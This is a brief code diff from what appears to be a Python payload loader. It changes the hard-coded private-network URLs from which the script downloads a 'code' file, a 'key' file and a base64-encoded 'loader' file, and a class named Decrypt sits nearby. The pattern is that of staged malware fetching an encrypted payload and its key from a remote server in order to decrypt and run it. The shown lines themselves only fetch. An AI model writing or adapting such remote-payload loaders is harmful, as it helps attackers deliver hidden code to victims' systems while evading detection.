@@ -96,9 +96,9 @@ class Decrypt:
 
 
 if __name__ == "__main__":
-    url_code = "http://192.168.2.131/code.txt"
-    url_key = "http://192.168.2.131/key.txt"
-    url_loader = "http://192.168.2.131/loader.txt"
+    url_code = "http://192.168.2.190:780/code.txt"
+    url_key = "http://192.168.2.190:780/key.txt"
+    url_loader = "http://192.168.2.190:780/loader.txt"
     key = urlopen(url_key).read().decode()
     code = urlopen(url_code).read().decode()
     base64_loader = urlopen(url_loader).read().decode()
